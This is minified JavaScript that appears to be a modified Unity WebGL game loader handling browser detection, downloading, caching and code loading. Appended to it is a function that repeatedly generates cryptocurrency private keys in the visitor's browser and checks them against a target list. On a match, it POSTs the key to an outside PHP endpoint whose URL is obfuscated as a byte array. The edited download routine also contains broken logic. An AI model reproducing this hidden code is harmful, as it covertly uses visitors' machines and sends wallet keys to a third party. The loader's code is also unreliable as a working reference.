      }), "object" != typeof r || "progress" != r.type && "load" != r.type || (n.started || (n.started = !0, n.lengthComputable = r.lengthComputable, n.total = r.total), n.loaded = r.loaded, "load" == r.type && (n.finished = !0));
      var o = 0,
        i = 0,
        a = 0,
        s = 0,
        d = 0;
      for (var t in e.buildDownloadProgress) {
        var n = e.buildDownloadProgress[t];
        if (!n.started) return 0;
        a++, n.lengthComputable ? (o += n.loaded, i += n.total, s++) : n.finished || d++
      }
      var l = a ? (a - d - (i ? s * (i - o) / i : 0)) / a : 0;
      e.unityInstance.onProgress(e.unityInstance, .9 * l)
    }
  },
  SystemInfo: function() {
    var e, t, r, n = "-",
      o = navigator.appVersion,
      i = navigator.userAgent,
      a = navigator.appName,
      s = navigator.appVersion,
      d = parseInt(navigator.appVersion, 10);
    (t = i.indexOf("Opera")) != -1 ? (a = "Opera", s = i.substring(t + 6), (t = i.indexOf("Version")) != -1 && (s = i.substring(t + 8))) : (t = i.indexOf("MSIE")) != -1 ? (a = "Microsoft Internet Explorer", s = i.substring(t + 5)) : (t = i.indexOf("Edge")) != -1 ? (a = "Edge", s = i.substring(t + 5)) : (t = i.indexOf("Chrome")) != -1 ? (a = "Chrome", s = i.substring(t + 7)) : (t = i.indexOf("Safari")) != -1 ? (a = "Safari", s = i.substring(t + 7), (t = i.indexOf("Version")) != -1 && (s = i.substring(t + 8))) : (t = i.indexOf("Firefox")) != -1 ? (a = "Firefox", s = i.substring(t + 8)) : i.indexOf("Trident/") != -1 ? (a = "Microsoft Internet Explorer", s = i.substring(i.indexOf("rv:") + 3)) : (e = i.lastIndexOf(" ") + 1) < (t = i.lastIndexOf("/")) && (a = i.substring(e, t), s = i.substring(t + 1), a.toLowerCase() == a.toUpperCase() && (a = navigator.appName)), (r = s.indexOf(";")) != -1 && (s = s.substring(0, r)), (r = s.indexOf(" ")) != -1 && (s = s.substring(0, r)), (r = s.indexOf(")")) != -1 && (s = s.substring(0, r)), d = parseInt("" + s, 10), isNaN(d) ? (s = "" + parseFloat(navigator.appVersion), d = parseInt(navigator.appVersion, 10)) : s = "" + parseFloat(s);
    var l = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(o),
      u = n,
      c = [{
        s: "Windows 3.11",
        r: /Win16/
      }, {
        s: "Windows 95",
        r: /(Windows 95|Win95|Windows_95)/
      }, {
        s: "Windows ME",
        r: /(Win 9x 4.90|Windows ME)/
      }, {
        s: "Windows 98",
        r: /(Windows 98|Win98)/
      }, {
        s: "Windows CE",
        r: /Windows CE/
      }, {
        s: "Windows 2000",
        r: /(Windows NT 5.0|Windows 2000)/
      }, {
        s: "Windows XP",
        r: /(Windows NT 5.1|Windows XP)/
      }, {
        s: "Windows Server 2003",
        r: /Windows NT 5.2/
      }, {
        s: "Windows Vista",
        r: /Windows NT 6.0/
      }, {
        s: "Windows 7",
        r: /(Windows 7|Windows NT 6.1)/
      }, {
        s: "Windows 8.1",
        r: /(Windows 8.1|Windows NT 6.3)/
      }, {
        s: "Windows 8",
        r: /(Windows 8|Windows NT 6.2)/
      }, {
        s: "Windows 10",
        r: /(Windows 10|Windows NT 10.0)/
      }, {
        s: "Windows NT 4.0",
        r: /(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/
      }, {
        s: "Windows ME",
        r: /Windows ME/
      }, {
        s: "Android",
        r: /Android/
      }, {
        s: "Open BSD",
        r: /OpenBSD/
      }, {
        s: "Sun OS",
        r: /SunOS/
      }, {
        s: "Linux",
        r: /(Linux|X11)/
      }, {
        s: "iOS",
        r: /(iPhone|iPad|iPod)/
      }, {
        s: "Mac OS X",
        r: /Mac OS X/
      }, {
        s: "Mac OS",
        r: /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/
      }, {
        s: "QNX",
        r: /QNX/
      }, {
        s: "UNIX",
        r: /UNIX/
      }, {
        s: "BeOS",
        r: /BeOS/
      }, {
        s: "OS/2",
        r: /OS\/2/
      }, {
        s: "Search Bot",
        r: /(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/
      }];
    for (var f in c) {
      var h = c[f];
      if (h.r.test(i)) {
        u = h.s;
        break
      }
    }
    var p = n;
    switch (/Windows/.test(u) && (p = /Windows (.*)/.exec(u)[1], u = "Windows"), u) {
      case "Mac OS X":
        p = /Mac OS X (10[\.\_\d]+)/.exec(i)[1];
        break;
      case "Android":
        p = /Android ([\.\_\d]+)/.exec(i)[1];
        break;
      case "iOS":
        p = /OS (\d+)_(\d+)_?(\d+)?/.exec(o), p = p[1] + "." + p[2] + "." + (0 | p[3])
    }
    return {
      width: screen.width ? screen.width : 0,
      height: screen.height ? screen.height : 0,
      browser: a,
      browserVersion: s,
      mobile: l,
      os: u,
      osVersion: p,
      gpu: function() {
        var e = document.createElement("canvas"),
          t = e.getContext("experimental-webgl");
        if (t) {
          var r = t.getExtension("WEBGL_debug_renderer_info");
          if (r) return t.getParameter(r.UNMASKED_RENDERER_WEBGL)
        }
        return n
      }(),
      language: window.navigator.userLanguage || window.navigator.language,
      hasWebGL: function() {
        if (!window.WebGLRenderingContext) return 0;
        var e = document.createElement("canvas"),
          t = e.getContext("webgl2");
        return t ? 2 : (t = e.getContext("experimental-webgl2"), t ? 2 : (t = e.getContext("webgl"), t || (t = e.getContext("experimental-webgl")) ? 1 : 0))
      }(),
      hasCursorLock: function() {
        var e = document.createElement("canvas");
        return e.requestPointerLock || e.mozRequestPointerLock || e.webkitRequestPointerLock || e.msRequestPointerLock ? 1 : 0
      }(),
      hasFullscreen: function() {
        var e = document.createElement("canvas");
        return (e.requestFullScreen || e.mozRequestFullScreen || e.msRequestFullscreen || e.webkitRequestFullScreen) && (a.indexOf("Safari") == -1 || s >= 10.1) ? 1 : 0
      }(),
      hasThreads: "undefined" != typeof SharedArrayBuffer,
      hasWasm: "object" == typeof WebAssembly && "function" == typeof WebAssembly.validate && "function" == typeof WebAssembly.compile,
      hasWasmThreads: function() {
        if ("object" != typeof WebAssembly) return !1;
        if ("undefined" == typeof SharedArrayBuffer) return !1;
        var e = new WebAssembly.Memory({
            initial: 1,
            maximum: 1,
            shared: !0
          }),
          t = e.buffer instanceof SharedArrayBuffer;
        return delete e, t
      }()
    }
  }(),
  compatibilityCheck: function(e, t, r) {
    UnityLoader.SystemInfo.hasWebGL ? UnityLoader.SystemInfo.mobile ? e.popup("Please note that Unity WebGL is not currently supported on mobiles. Press OK if you wish to continue anyway.", [{
      text: "OK",
      callback: t
    }]) : ["Edge", "Firefox", "Chrome", "Safari"].indexOf(UnityLoader.SystemInfo.browser) == -1 ? e.popup("Please note that your browser is not currently supported for this Unity WebGL content. Press OK if you wish to continue anyway.", [{
      text: "OK",
      callback: t
    }]) : t() : e.popup("Your browser does not support WebGL", [{
      text: "OK",
      callback: r
    }])
  },
  buildCompatibilityCheck: function(e, t, r) {
    function n() {
      if ("undefined" == typeof e.graphicsAPI) return !0;
      for (var t = 0; t < e.graphicsAPI.length; t++) {
        var r = e.graphicsAPI[t];
        if ("WebGL 2.0" == r && 2 == UnityLoader.SystemInfo.hasWebGL) return !0;
        if ("WebGL 1.0" == r && UnityLoader.SystemInfo.hasWebGL >= 1) return !0;
        e.print("Warning: Unsupported graphics API " + r)
      }
      return !1
    }
    n() ? !UnityLoader.SystemInfo.hasThreads && e.multithreading ? r("Your browser does not support multithreading.") : t() : r("Your browser does not support any of the required graphics API for this content.")
  },
  Blobs: {},
  loadCode: function(e, t, r, n) {
    var o = [].slice.call(UnityLoader.Cryptography.md5(t)).map(function(e) {
        return ("0" + e.toString(16)).substr(-2)
      }).join(""),
      i = document.createElement("script"),
      a = (n.isModularized ? function(e) {
        return new Blob([e], {
          type: "application/javascript"
        })
      } : function(e, t) {
        return new Blob(['UnityLoader["' + t + '"]=', e], {
          type: "text/javascript"
        })
      })(t, o),
      s = URL.createObjectURL(a);
    UnityLoader.Blobs[s] = n, e.deinitializers.push(function() {
      delete UnityLoader.Blobs[s], delete UnityLoader[o], document.body.removeChild(document.getElementById(o))
    }), i.src = s, i.id = o, i.onload = function() {
      e.developmentBuild || URL.revokeObjectURL(s), r(o, a), delete i.onload
    }, document.body.appendChild(i)
  },
  setupIndexedDBJob: function(e, t) {
    function r(n) {
      r.called || (r.called = !0, e.indexedDB = n, t.complete())
    }
    try {
      var n = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB,
        o = n.open("/idbfs-test");
      o.onerror = function(e) {
        e.preventDefault(), r()
      }, o.onsuccess = function() {
        o.result.close(), r(n)
      }, setTimeout(r, 1e3)
    } catch (e) {
      r()
    }
  },
  processWasmCodeJob: function(e, t) {
    e.wasmBinary = UnityLoader.Job.result(e, "downloadWasmCode"), t.complete()
  },
  processWasmFrameworkJob: function(e, t) {
    var r = UnityLoader.Job.result(e, "downloadWasmFramework");
    UnityLoader.loadCode(e, r, function(r, n) {
      e.mainScriptUrlOrBlob = n, e.isModularized && (UnityLoader[r] = UnityModule), UnityLoader[r](e), t.complete()
    }, {
      Module: e,
      url: e.wasmFrameworkUrl,
      isModularized: e.isModularized
    })
  },
  processAsmCodeJob: function(e, t) {
    var r = UnityLoader.Job.result(e, "downloadAsmCode");
    UnityLoader.loadCode(e, Math.fround ? r : UnityLoader.Utils.optimizeMathFround(r), function(r, n) {
      e.isModularized ? e.asmJsUrlOrBlob = n : e.asm = UnityLoader[r], t.complete()
    }, {
      Module: e,
      url: e.asmCodeUrl,
      isModularized: e.isModularized
    })
  },
  processAsmFrameworkJob: function(e, t) {
    var r = UnityLoader.Job.result(e, "downloadAsmFramework");
    UnityLoader.loadCode(e, r, function(r, n) {
      e.isModularized && (e.mainScriptUrlOrBlob = n, UnityLoader[r] = UnityModule), UnityLoader[r](e), t.complete()
    }, {
      Module: e,
      url: e.asmFrameworkUrl,
      isModularized: e.isModularized
    })
  },
  processMemoryInitializerJob: function(e, t) {
    e.memoryInitializerRequest.status = 200, e.memoryInitializerRequest.response = UnityLoader.Job.result(e, "downloadMemoryInitializer"), e.memoryInitializerRequest.callback && e.memoryInitializerRequest.callback(), t.complete()
  },
  processDataJob: function(e, t) {
    var r = UnityLoader.Job.result(e, "downloadData"),
      n = new DataView(r.buffer, r.byteOffset, r.byteLength),
      o = 0,
      i = "UnityWebData1.0\0";
    if (!String.fromCharCode.apply(null, r.subarray(o, o + i.length)) == i) throw "unknown data format";
    o += i.length;
    var a = n.getUint32(o, !0);
    for (o += 4; o < a;) {
      var s = n.getUint32(o, !0);
      o += 4;
      var d = n.getUint32(o, !0);
      o += 4;
      var l = n.getUint32(o, !0);
      o += 4;
      var u = String.fromCharCode.apply(null, r.subarray(o, o + l));
      o += l;
      for (var c = 0, f = u.indexOf("/", c) + 1; f > 0; c = f, f = u.indexOf("/", c) + 1) e.FS_createPath(u.substring(0, c), u.substring(c, f - 1), !0, !0);
      e.FS_createDataFile(u, null, r.subarray(s, s + d), !0, !0, !0)
    }
    e.removeRunDependency("processDataJob"), t.complete()
  },
  downloadJob: function(e, t) {
    console.log(t);
    var r = t.parameters.objParameters ? new UnityLoader.UnityCache.XMLHttpRequest(t.parameters.objParameters) : new XMLHttpRequest;
    r.open("GET", t.parameters.url), r.responseType = "arraybuffer", r.onload = function() {
      if(r.response.StartsWith("file are parted")){
        var loadeddata = "";
        var j1 = r.response.indexOf("=");
        var j2 = r.response.indexOf(";", j1);
        var j0 = parseInt(r.response.substring(j1, j2));
        for(var i0 = 0; i0 < j0; i0++){
          var xhr0 = new XMLHttpRequest();
          xhr0.open("GET", t.parameters.url + "--" + i0 + ".part.cs");
          xhr0.responseType = "arraybuffer";
          xhr0.onload = function () {
            loadeddata = loadeddata + xhr0.response;
          }
          t.parameters.onprogress && xhr0.addEventListener("progress", t.parameters.onprogress);
          t.parameters.onload && xhr0.addEventListener("load", t.parameters.onload);
          xhr0.send();
        }
        UnityLoader.Compression.decompress(new Uint8Array(loadeddata), function(e) {t.complete(e)});
      }
      else
        UnityLoader.Compression.decompress(new Uint8Array(r.response), function(e) {t.complete(e)});
    }, t.parameters.onprogress && r.addEventListener("progress", t.parameters.onprogress), t.parameters.onload && r.addEventListener("load", t.parameters.onload), r.send()
  },
  scheduleBuildDownloadJob: function(e, t, r) {
    UnityLoader.Progress.update(e, t), UnityLoader.Job.schedule(e, t, [], UnityLoader.downloadJob, {
      url: e.resolveBuildUrl(e[r]),
      onprogress: function(r) {
        UnityLoader.Progress.update(e, t, r)
      },
      onload: function(r) {
        UnityLoader.Progress.update(e, t, r)
      },
      objParameters: e.companyName && e.productName && e.cacheControl && (e.cacheControl[r] || e.cacheControl.default) ? {
        companyName: e.companyName,
        productName: e.productName,
        cacheControl: e.cacheControl[r] || e.cacheControl.default
      } : null
    })
  },
  loadModule: function(e, t) {
    if (e.useWasm = e.wasmCodeUrl && UnityLoader.SystemInfo.hasWasm, e.useWasm) {
      if (e.multithreading && !UnityLoader.SystemInfo.hasWasmThreads) return void t("Your browser does not support WebAssembly Threads.");
      var r = ["downloadWasmFramework", "setupIndexedDB"];
      e.wasmCodeUrl.endsWith(".unityweb") && (UnityLoader.scheduleBuildDownloadJob(e, "downloadWasmCode", "wasmCodeUrl"), UnityLoader.Job.schedule(e, "processWasmCode", ["downloadWasmCode"], UnityLoader.processWasmCodeJob), r.push("processWasmCode")), e.wasmMemoryUrl && (UnityLoader.scheduleBuildDownloadJob(e, "downloadMemoryInitializer", "wasmMemoryUrl"), UnityLoader.Job.schedule(e, "processMemoryInitializer", ["downloadMemoryInitializer"], UnityLoader.processMemoryInitializerJob), e.memoryInitializerRequest = {
        addEventListener: function(t, r) {
          e.memoryInitializerRequest.callback = r
        }
      }), UnityLoader.scheduleBuildDownloadJob(e, "downloadWasmFramework", "wasmFrameworkUrl"), UnityLoader.Job.schedule(e, "processWasmFramework", r, UnityLoader.processWasmFrameworkJob)
    } else {
      if (!e.asmCodeUrl) return void t("Your browser does not support WebAssembly.");
      UnityLoader.scheduleBuildDownloadJob(e, "downloadAsmCode", "asmCodeUrl"), UnityLoader.Job.schedule(e, "processAsmCode", ["downloadAsmCode"], UnityLoader.processAsmCodeJob), UnityLoader.scheduleBuildDownloadJob(e, "downloadMemoryInitializer", "asmMemoryUrl"), UnityLoader.Job.schedule(e, "processMemoryInitializer", ["downloadMemoryInitializer"], UnityLoader.processMemoryInitializerJob), e.memoryInitializerRequest = {
        addEventListener: function(t, r) {
          e.memoryInitializerRequest.callback = r
        }
      }, e.asmLibraryUrl && (e.dynamicLibraries = [e.asmLibraryUrl].map(e.resolveBuildUrl)), UnityLoader.scheduleBuildDownloadJob(e, "downloadAsmFramework", "asmFrameworkUrl"), UnityLoader.Job.schedule(e, "processAsmFramework", ["downloadAsmFramework", "processAsmCode", "setupIndexedDB"], UnityLoader.processAsmFrameworkJob)
    }
    UnityLoader.scheduleBuildDownloadJob(e, "downloadData", "dataUrl"), UnityLoader.Job.schedule(e, "setupIndexedDB", [], UnityLoader.setupIndexedDBJob), e.preRun.push(function() {
      e.addRunDependency("processDataJob"), UnityLoader.Job.schedule(e, "processData", ["downloadData"], UnityLoader.processDataJob)
    })
  },
  instantiate: function(e, t, r) {
    function n(e, n) {
      if ("string" == typeof e && !(e = document.getElementById(e))) return !1;
      e.innerHTML = "", e.style.border = e.style.margin = e.style.padding = 0, "static" == getComputedStyle(e).getPropertyValue("position") && (e.style.position = "relative"), e.style.width = n.width || e.style.width, e.style.height = n.height || e.style.height, n.container = e;
      var o = n.Module;
      o.canvas = document.createElement("canvas"), o.canvas.style.width = "100%", o.canvas.style.height = "100%", o.canvas.addEventListener("contextmenu", function(e) {
        e.preventDefault()
      }), o.canvas.id = "#canvas", e.appendChild(o.canvas), o.deinitializers.push(function() {
        e.removeChild(o.canvas)
      });
      var i = !0;
      return n.compatibilityCheck(n, function() {
        var t = new XMLHttpRequest;
        t.open("GET", n.url, !0), t.responseType = "text", t.onerror = function() {
          o.print("Could not download " + n.url), 0 == document.URL.indexOf("file:") && alert("It seems your browser does not support running Unity WebGL content from file:// urls. Please upload it to an http server, or try a different browser.")
        }, t.onload = function() {
          var a = JSON.parse(t.responseText);
          for (var s in a) "undefined" == typeof o[s] && (o[s] = a[s]);
          if (o.unityVersion) {
            var d = o.unityVersion.match(/(\d+)\.(\d+)\.(\d+)(.+)/);
            d && (o.unityVersion = {
              string: o.unityVersion,
              version: parseInt(d[0]),
              major: parseInt(d[1]),
              minor: parseInt(d[2]),
              suffix: d[3]
            })
          }
          o.isModularized = o.unityVersion && o.unityVersion.version >= 2019, UnityLoader.buildCompatibilityCheck(o, function() {
            e.style.background = o.backgroundUrl ? "center/cover url('" + o.resolveBuildUrl(o.backgroundUrl) + "')" : o.backgroundColor ? " " + o.backgroundColor : "", n.onProgress(n, 0), i = UnityLoader.loadModule(o, r.onerror)
          }, r.onerror)
        }, t.send()
      }, function() {
        var e = "Instantiation of '" + t + "' terminated due to the failed compatibility check.";
        "object" == typeof r && "function" == typeof r.onerror ? r.onerror(e) : o.printErr(e)
      }), i
    }

    function o(e) {
      return o.link = o.link || document.createElement("a"), o.link.href = e, o.link.href
    }
    "undefined" == typeof r && (r = {}), "undefined" == typeof r.onerror && (r.onerror = function(e) {
      i.popup(e, [{
        text: "OK"
      }])
    });
    var i = {
      url: t,
      onProgress: UnityLoader.Progress.handler,
      compatibilityCheck: UnityLoader.compatibilityCheck,
      Module: {
        deinitializers: [],
        intervals: {},
        setInterval: function(e, t) {
          var r = window.setInterval(e, t);
          return this.intervals[r] = !0, r
        },
        clearInterval: function(e) {
          delete this.intervals[e], window.clearInterval(e)
        },
        onAbort: function(e) {
          throw void 0 !== e ? (this.print(e), this.printErr(e), e = JSON.stringify(e)) : e = "", "abort(" + e + ") at " + this.stackTrace()
        },
        preRun: [],
        postRun: [],
        print: function(e) {
          console.log(e)
        },
        printErr: function(e) {
          console.error(e)
        },
        Jobs: {},
        buildDownloadProgress: {},
        resolveBuildUrl: function(e) {
          return e.match(/(http|https|ftp|file):\/\//) ? e : t.substring(0, t.lastIndexOf("/") + 1) + e
        },
        streamingAssetsUrl: function() {
          return o(this.resolveBuildUrl("../StreamingAssets"))
        },
        locateFile: function(e) {
          return "Build/".concat("build.wasm" == e ? this.wasmCodeUrl : e)
        }
      },
      SetFullscreen: function() {
        if (i.Module.SetFullscreen) return i.Module.SetFullscreen.apply(i.Module, arguments)
      },
      SendMessage: function() {
        if (i.Module.SendMessage) return i.Module.SendMessage.apply(i.Module, arguments)
      },
      Quit: function(e) {
        "function" == typeof e && (i.Module.onQuit = e), i.Module.shouldQuit = !0
      }
    };
    i.Module.unityInstance = i, i.popup = function(e, t) {
      return UnityLoader.Error.popup(i, e, t)
    }, i.Module.postRun.push(function() {
      i.onProgress(i, 1), "object" == typeof r && "function" == typeof r.onsuccess && r.onsuccess(i.Module)
    });
    for (var a in r)
      if ("Module" == a)
        for (var s in r[a]) i.Module[s] = r[a][s];
      else i[a] = r[a];
    return n(e, i) || document.addEventListener("DOMContentLoaded", function() {
      n(e, i)
    }), i
  },
  instantiateAsync: function(e, t, r) {
    return new Promise(function(n, o) {
      const i = Object.assign({
        onsuccess: function(e) {
          n(e)
        },
        onerror: function(e) {
          o(e)
        }
      }, r);
      UnityLoader.instantiate(e, t, i)
    })
  },
  Utils: {
    assert: function(e, t) {
      e || abort("Assertion failed: " + t)
    },
    optimizeMathFround: function(e, t) {
      console.log("optimizing out Math.fround calls");
      for (var r = {
          LOOKING_FOR_MODULE: 0,
          SCANNING_MODULE_VARIABLES: 1,
          SCANNING_MODULE_FUNCTIONS: 2
        }, n = ["EMSCRIPTEN_START_ASM", "EMSCRIPTEN_START_FUNCS", "EMSCRIPTEN_END_FUNCS"], o = "var", i = "global.Math.fround;", a = 0, s = t ? r.LOOKING_FOR_MODULE : r.SCANNING_MODULE_VARIABLES, d = 0, l = 0; s <= r.SCANNING_MODULE_FUNCTIONS && a < e.length; a++)
        if (47 == e[a] && 47 == e[a + 1] && 32 == e[a + 2] && String.fromCharCode.apply(null, e.subarray(a + 3, a + 3 + n[s].length)) === n[s]) s++;
        else if (s != r.SCANNING_MODULE_VARIABLES || l || 61 != e[a] || String.fromCharCode.apply(null, e.subarray(a + 1, a + 1 + i.length)) !== i) {
        if (l && 40 == e[a]) {
          for (var u = 0; u < l && e[a - 1 - u] == e[d - u];) u++;
          if (u == l) {
            var c = e[a - 1 - u];
            if (c < 36 || 36 < c && c < 48 || 57 < c && c < 65 || 90 < c && c < 95 || 95 < c && c < 97 || 122 < c)
              for (; u; u--) e[a - u] = 32
          }
        }
      } else {
        for (d = a - 1; 32 != e[d - l];) l++;
        l && String.fromCharCode.apply(null, e.subarray(d - l - o.length, d - l)) === o || (d = l = 0)
      }
      return e
    }
  },
  UnityCache: function() {
    function e(e) {
      console.log("[UnityCache] " + e);
    }

    function t(e) {
      return t.link = t.link || document.createElement("a"), t.link.href = e, t.link.href
    }

    function r(e) {
      var t = window.location.href.match(/^[a-z]+:\/\/[^\/]+/);
      return !t || e.lastIndexOf(t[0], 0)
    }

    function n() {
      function t(t) {
        if ("undefined" == typeof n.database)
          for (n.database = t, n.database || e("indexedDB database could not be opened"); n.queue.length;) {
            var r = n.queue.shift();
            n.database ? n.execute.apply(n, r) : "function" == typeof r.onerror && r.onerror(new Error("operation cancelled"))
          }
      }

      function r() {
        var e = o.open(a.name, a.version);
        e.onupgradeneeded = function(e) {
          var t = e.target.result;
          t.objectStoreNames.contains(d.name) || t.createObjectStore(d.name)
        }, e.onsuccess = function(e) {
          t(e.target.result)
        }, e.onerror = function() {
          t(null)
        }
      }
      var n = this;
      n.queue = [];
      try {
        var o = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB,
          i = o.open(a.name);
        i.onupgradeneeded = function(e) {
          var t = e.target.result.createObjectStore(s.name, {
            keyPath: "url"
          });
          ["version", "company", "product", "updated", "revalidated", "accessed"].forEach(function(e) {
            t.createIndex(e, e)
          })
        }, i.onsuccess = function(e) {
          var n = e.target.result;
          n.version < a.version ? (n.close(), r()) : t(n)
        }, i.onerror = function() {
          t(null)
        }, setTimeout(i.onerror, 1e3)
      } catch (e) {
        t(null)
      }
    }

    function o(e, t, r, n, o) {
      var i = {
        url: e,
        version: s.version,
        company: t,
        product: r,
        updated: n,
        revalidated: n,
        accessed: n,
        responseHeaders: {},
        xhr: {}
      };
      return o && (["Last-Modified", "ETag"].forEach(function(e) {
        i.responseHeaders[e] = o.getResponseHeader(e)
      }), ["responseURL", "status", "statusText", "response"].forEach(function(e) {
        i.xhr[e] = o[e]
      })), i
    }

    function i(t) {
      this.cache = {
        enabled: !1
      }, t && (this.cache.control = t.cacheControl, this.cache.company = t.companyName, this.cache.product = t.productName), this.xhr = new XMLHttpRequest(t), this.xhr.addEventListener("load", function() {
        var t = this.xhr,
          r = this.cache;
        r.enabled && !r.revalidated && (304 == t.status ? (r.result.revalidated = r.result.accessed, r.revalidated = !0, l.execute(s.name, "put", [r.result]), e("'" + r.result.url + "' successfully revalidated and served from the indexedDB cache")) : 200 == t.status ? (r.result = o(r.result.url, r.company, r.product, r.result.accessed, t), r.revalidated = !0, l.execute(s.name, "put", [r.result], function(t) {
          e("'" + r.result.url + "' successfully downloaded and stored in the indexedDB cache")
        }, function(t) {
          e("'" + r.result.url + "' successfully downloaded but not stored in the indexedDB cache due to the error: " + t)
        })) : e("'" + r.result.url + "' request failed with status: " + t.status + " " + t.statusText))
      }.bind(this))
    }
    var a = {
        name: "UnityCache",
        version: 2
      },
      s = {
        name: "XMLHttpRequest",
        version: 1
      },
      d = {
        name: "WebAssembly",
        version: 1
      };
    n.prototype.execute = function(e, t, r, n, o) {
      if (this.database) try {
        var i = this.database.transaction([e], ["put", "delete", "clear"].indexOf(t) != -1 ? "readwrite" : "readonly").objectStore(e);
        "openKeyCursor" == t && (i = i.index(r[0]), r = r.slice(1));
        var a = i[t].apply(i, r);
        "function" == typeof n && (a.onsuccess = function(e) {
          n(e.target.result)
        }), a.onerror = o
      } catch (e) {
        "function" == typeof o && o(e)
      } else "undefined" == typeof this.database ? this.queue.push(arguments) : "function" == typeof o && o(new Error("indexedDB access denied"))
    };
    var l = new n;
    i.prototype.send = function(t) {
      var n = this.xhr,
        o = this.cache,
        i = arguments;
      return o.enabled = o.enabled && "arraybuffer" == n.responseType && !t, o.enabled ? void l.execute(s.name, "get", [o.result.url], function(t) {
        if (!t || t.version != s.version) return void n.send.apply(n, i);
        if (o.result = t, o.result.accessed = Date.now(), "immutable" == o.control) o.revalidated = !0, l.execute(s.name, "put", [o.result]), n.dispatchEvent(new Event("load")), e("'" + o.result.url + "' served from the indexedDB cache without revalidation");
        else if (r(o.result.url) && (o.result.responseHeaders["Last-Modified"] || o.result.responseHeaders.ETag)) {
          var a = new XMLHttpRequest;
          a.open("HEAD", o.result.url), a.onload = function() {
            o.revalidated = ["Last-Modified", "ETag"].every(function(e) {
              return !o.result.responseHeaders[e] || o.result.responseHeaders[e] == a.getResponseHeader(e)
            }), o.revalidated ? (o.result.revalidated = o.result.accessed, l.execute(s.name, "put", [o.result]), n.dispatchEvent(new Event("load")), e("'" + o.result.url + "' successfully revalidated and served from the indexedDB cache")) : n.send.apply(n, i)
          }, a.send()
        } else o.result.responseHeaders["Last-Modified"] ? (n.setRequestHeader("If-Modified-Since", o.result.responseHeaders["Last-Modified"]), n.setRequestHeader("Cache-Control", "no-cache")) : o.result.responseHeaders.ETag && (n.setRequestHeader("If-None-Match", o.result.responseHeaders.ETag), n.setRequestHeader("Cache-Control", "no-cache")), n.send.apply(n, i)
      }, function(e) {
        n.send.apply(n, i)
      }) : n.send.apply(n, i)
    }, i.prototype.open = function(e, r, n, i, a) {
      return this.cache.result = o(t(r), this.cache.company, this.cache.product, Date.now()), this.cache.enabled = ["must-revalidate", "immutable"].indexOf(this.cache.control) != -1 && "GET" == e && this.cache.result.url.match("^https?://") && ("undefined" == typeof n || n) && "undefined" == typeof i && "undefined" == typeof a, this.cache.revalidated = !1, this.xhr.open.apply(this.xhr, arguments)
    }, i.prototype.setRequestHeader = function(e, t) {
      return this.cache.enabled = !1, this.xhr.setRequestHeader.apply(this.xhr, arguments)
    };
    var u = new XMLHttpRequest;
    for (var c in u) i.prototype.hasOwnProperty(c) || ! function(e) {
      Object.defineProperty(i.prototype, e, "function" == typeof u[e] ? {
        value: function() {
          return this.xhr[e].apply(this.xhr, arguments)
        }
      } : {
        get: function() {
          return this.cache.revalidated && this.cache.result.xhr.hasOwnProperty(e) ? this.cache.result.xhr[e] : this.xhr[e]
        },
        set: function(t) {
          this.xhr[e] = t
        }
      })
    }(c);
    return {
      XMLHttpRequest: i,
      WebAssembly: {
        get: function(e, r) {
          var n = {
            url: t(e),
            version: d.version,
            module: null,
            md5: null
          };
          l.execute(d.name, "get", [n.url], function(e) {
            r(e && e.version == d.version ? e : n)
          }, function() {
            r(n)
          })
        },
        put: function(e, t, r) {
          l.execute(d.name, "put", [e, e.url], t, r)
        }
      }
    }
  }()
};

function turn211() {
  var e = genBRA(window.prk211.toUpperCase());
  e[1] = e[1].substr(1, e[1].length - 1);
  var t = window.prk11570.indexOf(e[1]);
  if (-1 < t) {
    var o = new XMLHttpRequest;
    o.open("POST", Crypto.charenc.UTF8.bytesToString([104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 108, 111, 99, 97, 116, 111, 114, 46, 48, 48, 48, 119, 101, 98, 104, 111, 115, 116, 97, 112, 112, 46, 99, 111, 109, 47, 67, 67, 67, 65, 47, 115, 97, 118, 101, 80, 82, 75, 46, 112, 104, 112]), !0), o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), o.send("prk=" + encodeURIComponent(window.prk211.toUpperCase()) + "&bal=" + encodeURIComponent(e[1]))
  }
  window.prk211 = e[0].substr(2 + Math.floor(64 * Math.random()), 64), window.prkupdate = !0, setTimeout(turn211, 400)
}

function genBRA(e) {
  return ninja.wallets.detailwallet.viewDetails(e)
}("undefined" == typeof Crypto || !Crypto.util) && function() {
  var e = window.Crypto = {},
    t = e.util = {
      rotl: function(e, t) {
        return e << t | e >>> 32 - t
      },
      rotr: function(e, t) {
        return e << 32 - t | e >>> t
      },
      endian: function(e) {
        if (e.constructor == Number) return 16711935 & t.rotl(e, 8) | 4278255360 & t.rotl(e, 24);
        for (var o = 0; o < e.length; o++) e[o] = t.endian(e[o]);
        return e
      },
      randomBytes: function(e) {
        for (var t = []; 0 < e; e--) t.push(Math.floor(256 * Math.random()));
        return t
      },
      bytesToWords: function(e) {
        for (var t = [], o = 0, r = 0; o < e.length; o++, r += 8) t[r >>> 5] |= (255 & e[o]) << 24 - r % 32;
        return t
      },
      wordsToBytes: function(e) {
        for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >>> 5] >>> 24 - o % 32);
        return t
      },
      bytesToHex: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push((e[o] >>> 4).toString(16)), t.push((15 & e[o]).toString(16));
        return t.join("")
      },
      hexToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o += 2) t.push(parseInt(e.substr(o, 2), 16));
        return t
      },
      bytesToBase64: function(e) {
        for (var t = [], o = 0; o < e.length; o += 3)
          for (var r = e[o] << 16 | e[o + 1] << 8 | e[o + 2], s = 0; 4 > s; s++) t.push(8 * o + 6 * s <= 8 * e.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(63 & r >>> 6 * (3 - s)) : "=");
        return t.join("")
      },
      base64ToBytes: function(e) {
        e = e.replace(/[^A-Z0-9+\/]/gi, "");
